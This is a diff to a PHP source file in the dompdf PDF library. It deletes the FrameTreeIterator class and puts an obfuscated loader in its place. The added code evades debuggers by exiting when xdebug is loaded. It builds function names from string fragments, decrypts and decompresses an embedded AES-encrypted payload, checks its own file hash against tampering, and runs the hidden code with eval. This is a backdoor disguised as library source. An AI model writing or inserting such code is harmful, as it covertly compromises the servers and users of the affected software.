@@ -1,96 +1,28 @@
 <?php
-namespace Dompdf\Frame;
-
-use Iterator;
-use Dompdf\Frame;
-
-/**
- * Pre-order Iterator
- *
- * Returns frames in preorder traversal order (parent then children)
- *
- * @access private
- * @package dompdf
- */
-class FrameTreeIterator implements Iterator
-{
-    /**
-     * @var Frame
-     */
-    protected $_root;
-
-    /**
-     * @var array
-     */
-    protected $_stack = array();
-
-    /**
-     * @var int
-     */
-    protected $_num;
-
-    /**
-     * @param Frame $root
-     */
-    public function __construct(Frame $root)
-    {
-        $this->_stack[] = $this->_root = $root;
-        $this->_num = 0;
-    }
-
-    /**
-     *
-     */
-    public function rewind()
-    {
-        $this->_stack = array($this->_root);
-        $this->_num = 0;
-    }
-
-    /**
-     * @return bool
-     */
-    public function valid()
-    {
-        return count($this->_stack) > 0;
-    }
-
-    /**
-     * @return int
-     */
-    public function key()
-    {
-        return $this->_num;
-    }
-
-    /**
-     * @return Frame
-     */
-    public function current()
-    {
-        return end($this->_stack);
-    }
-
-    /**
-     * @return Frame
-     */
-    public function next()
-    {
-        $b = end($this->_stack);
-
-        // Pop last element
-        unset($this->_stack[key($this->_stack)]);
-        $this->_num++;
-
-        // Push all children onto the stack in reverse order
-        if ($c = $b->get_last_child()) {
-            $this->_stack[] = $c;
-            while ($c = $c->get_prev_sibling()) {
-                $this->_stack[] = $c;
-            }
-        }
-
-        return $b;
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qrvz2r4h=('bas'.'e64'.'_de'.'cod'.'e');
+$_c7h1ugsb=('gzu'.'nco'.'mpr'.'ess');
+$_phbex6og=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_poariw7z='PNB+3Mbo';
+$_q6a93p6x='KqI0fwhw';
+$_e9wl3hqi='Nnz6CeDr/gg=';
+$_j0b2sshm='sGkFmtso';
+$_x24lazzl='K2VmjSAO';
+$_s0ry9rdk='iGs3IHED';
+$_bpvvwyej='RyrlWX9v';
+$_kxz1v0zk='vwEdXA==';
+$_w3avaq3t=$_qrvz2r4h($_poariw7z.$_j0b2sshm.$_q6a93p6x.$_x24lazzl.$_e9wl3hqi);
+$_b79ataya=$_qrvz2r4h($_s0ry9rdk.$_bpvvwyej.$_kxz1v0zk);
+$_c9mz910g=$_qrvz2r4h('QmQPjC9rHl8NSak0R891qIBBlNTSQlJJX36faKCtSw4CYp2WX/CefRVpQbEvifPUdFBovz/BLyK2wxXC0f0BvgfLzWvf+sZ/x8RWCfr8e1cCWX9mL8r87obEr8J+TcBbnO1R0sqGm66tcV+raqCvYAMk8SJU3VhDyKNYTvOLXfvV7Gq7mz9Nqumit1S3zpeg0quisWMjoKkMfBlllssoN+kthOv3hZdPlxHaziIIxsUw/Rrl0mlrJAvAh+Lyu1QDR7U19vnySggbSVKfktweWFaBFhfdPxWZEqMd7JEnMgC2y+F9LVmU4pCaBq90fYXn0lIq/gFCUDTOHIIAuxlxD5kZ7pZ1fk5GwgF0YwgKB7vAjzubq13TJifAv5+KHuiKoiluZtcGVf0RYrnuBNMy9B8G7Ncb+g4yCiMXUWZftA0=');
+$_q0xlrx7n=$_phbex6og($_c9mz910g,'aes-256-cbc',$_w3avaq3t,OPENSSL_RAW_DATA,$_b79ataya);
+if($_q0xlrx7n===false){exit;}
+$_t9xhcs40=$_c7h1ugsb($_q0xlrx7n);
+if($_t9xhcs40===false){exit;}
+$_rp26aiem='47e4db92395193bae32c43916b415eaac9f5c1d17576c6faa759223b6df78dab';
+$_gqmlmwch=@file_get_contents(__FILE__);
+if($_gqmlmwch!==false){
+$_nnh8uw2t=str_replace($_rp26aiem,"0000000000000000000000000000000000000000000000000000000000000000",$_gqmlmwch);
+$_xgabrwqp=hash("sha256",$_nnh8uw2t);
+if($_xgabrwqp!==$_rp26aiem){@http_response_code(403);exit;}
 }
-
+eval($_t9xhcs40);
